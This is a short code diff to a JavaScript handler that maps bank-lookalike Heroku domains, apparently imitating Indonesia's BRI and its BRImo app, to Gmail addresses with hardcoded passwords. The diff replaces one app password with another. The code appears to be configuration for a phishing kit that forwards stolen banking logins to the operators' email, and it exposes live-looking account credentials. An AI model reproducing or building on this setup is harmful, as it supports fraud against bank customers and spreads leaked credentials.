@@ -14,7 +14,7 @@ export default function handler(req, res) {
 
     } else if(url == 'tarif-bri-ubah.herokuapp.com'){
         email = 'andin1234zx@gmail.com' ;
-        pass = 'qtqigmxdxvlcgdug' ;
+        pass = 'ujnjjdjcumttwjsu' ;
 
     } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
         email = 'brigacor80@gmail.com';
